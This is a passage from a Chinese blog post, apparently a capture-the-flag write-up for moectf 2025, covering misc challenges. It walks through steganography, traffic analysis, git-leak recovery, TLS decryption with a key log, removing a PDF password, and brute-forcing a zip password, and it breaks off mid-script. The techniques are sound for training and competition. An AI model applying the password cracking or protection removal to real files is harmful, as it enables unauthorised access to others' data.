<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="伊卡洛维奇"><meta name="copyright" content="伊卡洛维奇"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>2025moectf web misc wp | Ikalovic@Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"lunereal.1kal0vic.top","root":"/","title":"kawayi","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="战果：web和misc 除了最后出的几道ak，复仇成功喵 misc1.RUSH下载附件，发现是gif动图，拆分图片后用qrreaserch扫描，获得flag 2.ez_LSB下载附件是png图片，结合题目，推测是lsb隐写，用Stegsolver尝试得到 base64解码获得flag：moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd} 3.ez_锟斤拷????下载附件是熟悉的">
<meta property="og:type" content="article">
<meta property="og:title" content="2025moectf web misc wp">
<meta property="og:url" content="http://lunereal.1kal0vic.top/2025/04/22/moe%E6%88%98%E6%9E%9C/index.html">
<meta property="og:site_name" content="Ikalovic@Hexo">
<meta property="og:description" content="战果：web和misc 除了最后出的几道ak，复仇成功喵 misc1.RUSH下载附件，发现是gif动图，拆分图片后用qrreaserch扫描，获得flag 2.ez_LSB下载附件是png图片，结合题目，推测是lsb隐写，用Stegsolver尝试得到 base64解码获得flag：moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd} 3.ez_锟斤拷????下载附件是熟悉的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/1.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/2.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/3.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/4.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/5.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/6.png">
<meta property="article:published_time" content="2025-04-22T09:46:23.000Z">
<meta property="article:modified_time" content="2025-10-12T04:58:01.870Z">
<meta property="article:author" content="伊卡洛维奇">
<meta property="article:tag" content="-web -misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lunereal.1kal0vic.top/images/img/moe2025/1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="伊卡洛维奇"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="伊卡洛维奇"><span class="site-author-status" title="loli赛高">☺️</span></a><div class="site-author-name"><a href="/about/">伊卡洛维奇</a></div><span class="site-name">Ikalovic@Hexo</span><sub class="site-subtitle">kawayi</sub><div class="site-description">loli赛高</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/girls/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:women-line"></span></span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Ikalovic" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/327357699" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-RUSH"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.RUSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ez-LSB"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.ez_LSB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ez-%E9%94%9F%E6%96%A4%E6%8B%B7"><span class="toc-number">1.0.3.</span> <span class="toc-text">3.ez_锟斤拷????</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-weird-photo"><span class="toc-number">1.0.4.</span> <span class="toc-text">4.weird_photo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-SSTV"><span class="toc-number">1.0.5.</span> <span class="toc-text">5.SSTV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-encrypted-pdf"><span class="toc-number">1.0.6.</span> <span class="toc-text">6.encrypted_pdf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%8D%82%E4%BD%8F%E4%B8%80%E5%8F%AA%E8%80%B3"><span class="toc-number">1.0.7.</span> <span class="toc-text">7.捂住一只耳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-Enchantment"><span class="toc-number">1.0.8.</span> <span class="toc-text">8.Enchantment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-WebRepo"><span class="toc-number">1.0.9.</span> <span class="toc-text">9.WebRepo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-ez-ssl"><span class="toc-number">1.0.10.</span> <span class="toc-text">10.ez_ssl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-ez-png"><span class="toc-number">1.0.11.</span> <span class="toc-text">11.ez_png</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E4%B8%87%E9%87%8C%E6%8C%91%E4%B8%80"><span class="toc-number">1.0.12.</span> <span class="toc-text">12.万里挑一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Encrypted-volume"><span class="toc-number">1.0.13.</span> <span class="toc-text">13.Encrypted volume</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E5%93%88%E5%9F%BA%E7%B1%B3%E9%9A%BE%E6%B2%A1%E9%9C%B2%E8%BA%B2"><span class="toc-number">1.0.14.</span> <span class="toc-text">14.哈基米难没露躲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-2048-master"><span class="toc-number">1.0.15.</span> <span class="toc-text">15.2048_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-Pyjail-0"><span class="toc-number">1.0.16.</span> <span class="toc-text">16.Pyjail 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-Pyjail-1"><span class="toc-number">1.0.17.</span> <span class="toc-text">17.Pyjail 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-Pyjail-2"><span class="toc-number">1.0.18.</span> <span class="toc-text">18.Pyjail 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-Pyjail-3"><span class="toc-number">1.0.19.</span> <span class="toc-text">19.Pyjail 3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="toc-number">2.0.1.</span> <span class="toc-text">01 第一章 神秘的手镯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="toc-number">2.0.2.</span> <span class="toc-text">02 第二章 初识金曦玄轨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="toc-number">2.0.3.</span> <span class="toc-text">03 第三章 问剑石！篡天改命！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="toc-number">2.0.4.</span> <span class="toc-text">04 第四章 金曦破禁与七绝傀儡阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="toc-number">2.0.5.</span> <span class="toc-text">05 第五章 打上门来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="toc-number">2.0.6.</span> <span class="toc-text">06 第六章 藏经禁制？玄机初探！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="toc-number">2.0.7.</span> <span class="toc-text">07 第七章 灵蛛探穴与阴阳双生符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="toc-number">2.0.8.</span> <span class="toc-text">08 第八章 天衍真言，星图显圣</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#09-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="toc-number">2.0.9.</span> <span class="toc-text">09 第九章 星墟禁制·天机问路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5-revenge"><span class="toc-number">2.0.10.</span> <span class="toc-text">10 第十章 天机符阵_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="toc-number">2.0.11.</span> <span class="toc-text">11 第十一章 千机变·破妄之眼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="toc-number">2.0.12.</span> <span class="toc-text">12 第十二章 玉魄玄关·破妄</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="toc-number">2.0.13.</span> <span class="toc-text">13 第十三章 通幽关·灵纹诡影</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%BE%A1%E7%A5%9E%E5%85%B3%C2%B7%E8%A1%A5%E5%A4%A9%E7%8E%89%E7%A2%91"><span class="toc-number">2.0.14.</span> <span class="toc-text">14 第十四章 御神关·补天玉碑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E5%BD%92%E7%9C%9F%E5%85%B3%C2%B7%E7%AB%9E%E6%97%B6%E5%87%80%E9%AD%94"><span class="toc-number">2.0.15.</span> <span class="toc-text">15 第十五章 归真关·竞时净魔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="toc-number">2.0.16.</span> <span class="toc-text">16 第十六章 昆仑星途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="toc-number">2.0.17.</span> <span class="toc-text">17 第十七章 星骸迷阵·神念重构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-%E4%B8%87%E5%8D%B7%E8%AF%A1%E9%98%81%C2%B7%E5%8A%9F%E6%B3%95%E8%BF%9E%E7%8E%AF"><span class="toc-number">2.0.18.</span> <span class="toc-text">18 第十八章 万卷诡阁·功法连环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="toc-number">2.0.19.</span> <span class="toc-text">19 第十九章 星穹真相·补天归源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="toc-number">2.0.20.</span> <span class="toc-text">19 第十九章_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="toc-number">2.0.21.</span> <span class="toc-text">20 第二十章 幽冥血海·幻语心魔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%BE%80%E7%94%9F%E6%BC%A9%E6%B6%A1%C2%B7%E8%A8%80%E7%81%B5%E6%AD%BB%E5%B1%80"><span class="toc-number">2.0.22.</span> <span class="toc-text">21 第二十一章 往生漩涡·言灵死局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="toc-number">2.0.23.</span> <span class="toc-text">22 第二十二章 血海核心·千年手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%B8%E9%87%91%E5%81%B6%E9%81%87FLAG%EF%BC%8C%E6%8B%BC%E5%B0%BD%E5%85%A8%E5%8A%9B%E9%9A%BE%E6%88%98%E8%83%9C"><span class="toc-number">2.0.24.</span> <span class="toc-text">摸金偶遇FLAG，拼尽全力难战胜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell%EF%BC%9F"><span class="toc-number">2.0.25.</span> <span class="toc-text">这是…Webshell？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E2%80%A6Webshell-revenge"><span class="toc-number">2.0.26.</span> <span class="toc-text">这是…Webshell?_revenge</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://lunereal.1kal0vic.top/2025/04/22/moe%E6%88%98%E6%9E%9C/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="伊卡洛维奇"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ikalovic@Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2025moectf web misc wp</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-04-22 17:46:23" itemprop="dateCreated datePublished" datetime="2025-04-22T17:46:23+08:00">2025-04-22</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-10-12 12:58:01" itemprop="dateModified" datetime="2025-10-12T12:58:01+08:00">2025-10-12</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/ctf%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">-ctf复现</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web-misc/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">-web -misc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>战果：web和misc 除了最后出的几道ak，复仇成功喵</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="1-RUSH"><a href="#1-RUSH" class="headerlink" title="1.RUSH"></a>1.RUSH</h3><p>下载附件，发现是gif动图，拆分图片后用qrreaserch扫描，获得flag</p>
<h3 id="2-ez-LSB"><a href="#2-ez-LSB" class="headerlink" title="2.ez_LSB"></a>2.ez_LSB</h3><p>下载附件是png图片，结合题目，推测是lsb隐写，用Stegsolver尝试得到<img src="https://lunereal.1kal0vic.top/images/img/moe2025/1.png" alt="1" loading="lazy"></p>
<p>base64解码获得flag：moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}</p>
<h3 id="3-ez-锟斤拷"><a href="#3-ez-锟斤拷" class="headerlink" title="3.ez_锟斤拷????"></a>3.ez_锟斤拷????</h3><p>下载附件是熟悉的乱码，以前经常下盗版游戏的同学对此肯定很熟悉，切换为gbk编码，得到flag</p>
<h3 id="4-weird-photo"><a href="#4-weird-photo" class="headerlink" title="4.weird_photo"></a>4.weird_photo</h3><p>题目提示crc错误，简单推测为图片宽高被修改了，恢复宽高，获得flag</p>
<h3 id="5-SSTV"><a href="#5-SSTV" class="headerlink" title="5.SSTV"></a>5.SSTV</h3><p>下载附件获得音频，结合题目sstv可以得知其类型，使用MMSSTV<img src="https://lunereal.1kal0vic.top/images/img/moe2025/2.png" alt="2" loading="lazy"></p>
<h3 id="6-encrypted-pdf"><a href="#6-encrypted-pdf" class="headerlink" title="6.encrypted_pdf"></a>6.encrypted_pdf</h3><p>下载附件是加密的pdf，使用<a target="_blank" rel="noopener" href="https://www.ilovepdf.com/zh-cn/unlock_pdf%E7%BD%91%E7%AB%99%EF%BC%8C%E6%88%90%E5%8A%9F%E7%A7%BB%E9%99%A4%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%93%E5%BC%80pdf%E4%BB%A5%E5%90%8Ectrl+f%E6%90%9C%E7%B4%A2moectf,%E7%84%B6%E5%90%8E%E5%B0%86%E9%82%A3%E4%B8%80%E8%A1%8C%E5%A4%8D%E5%88%B6%E5%B0%B1%E8%8E%B7%E5%BE%97%E4%BA%86flag%EF%BC%8C%E4%B8%8E%E7%AD%BE%E5%88%B0%E9%A2%98%E4%B8%80%E6%A0%B7%E3%80%82">https://www.ilovepdf.com/zh-cn/unlock_pdf网站，成功移除密码，打开pdf以后ctrl+f搜索moectf,然后将那一行复制就获得了flag，与签到题一样。</a></p>
<h3 id="7-捂住一只耳"><a href="#7-捂住一只耳" class="headerlink" title="7.捂住一只耳"></a>7.捂住一只耳</h3><p>由题目名称很容易想到单声道。使用Audacity打开，<img src="https://lunereal.1kal0vic.top/images/img/moe2025/3.png" alt="3" loading="lazy"></p>
<p>不难发现上面是摩斯密码，解密获得 flag</p>
<h3 id="8-Enchantment"><a href="#8-Enchantment" class="headerlink" title="8.Enchantment"></a>8.Enchantment</h3><p>典型的流量分析题目，用wireshark打开，发现可疑流量包序列193，发现是传输了一张图片，查看，<img src="https://lunereal.1kal0vic.top/images/img/moe2025/4.png" alt="4" loading="lazy"></p>
<p>根据题目附魔台上的文字不太对劲，猜测为flag的编码，经查发现是银河编码，解码获得flag。</p>
<h3 id="9-WebRepo"><a href="#9-WebRepo" class="headerlink" title="9.WebRepo"></a>9.WebRepo</h3><p>下载后发现是张二维码，扫码提示我们使用binwalk，用010查看发现里面藏着7z压缩包，直接将文件后缀名改为.7z，解压得到了.git文件夹，是git泄露,使用git_extract还原flag.txt,得到flag：moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}</p>
<h3 id="10-ez-ssl"><a href="#10-ez-ssl" class="headerlink" title="10.ez_ssl"></a>10.ez_ssl</h3><p>又是经典的流量分析，由题目可知是ssl加密流量分析。</p>
<p>首先用CTF netA,获得TLS&#x2F;SSL 会话密钥日志文件（SSLKEYLOGFILE 格式）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary1EV4LSnnRBL8OzyBContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ssl.log&quot;Content-Type: application/octet-streamCLIENT_RANDOM 5cc9d58e7bf7268c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4------WebKitFormBoundary1EV4LSnnRBL8OzyB--</span><br></pre></td></tr></table></figure>

<p>将其保存为ssl.log,然后再次运行CTF NetA,获得加密后的压缩包，查看压缩包备注得知密码为7位纯数字，用ARCHPR爆破，得到flag。</p>
<h3 id="11-ez-png"><a href="#11-ez-png" class="headerlink" title="11.ez_png"></a>11.ez_png</h3><p>由题目提示数据段不对劲，推测位IDAT块隐写，使用pngcheck查看<img src="https://lunereal.1kal0vic.top/images/img/moe2025/5.png" alt="5" loading="lazy"></p>
<p>发现不对劲的数据，使用010将不对劲的数据截取下来。使用脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def decompress_idat_raw(hex_data):</span><br><span class="line">    # 移除空格和换行，转换为bytes</span><br><span class="line">    hex_clean = hex_data.replace(&quot; &quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">    raw_bytes = binascii.unhexlify(hex_clean)</span><br><span class="line"></span><br><span class="line">    # 跳过非IDAT部分（直接定位到zlib压缩数据）</span><br><span class="line">    # 你的数据中，IDAT块从 `78 9C` 开始（zlib头）</span><br><span class="line">    zlib_start = raw_bytes.find(b&#x27;x\x9C&#x27;)  # zlib默认压缩头</span><br><span class="line">    if zlib_start == -1:</span><br><span class="line">        print(&quot;错误：未找到zlib压缩数据头（78 9C）&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    zlib_data = raw_bytes[zlib_start:]  # 提取zlib压缩数据</span><br><span class="line"></span><br><span class="line">    # 尝试解压</span><br><span class="line">    try:</span><br><span class="line">        decompressed = 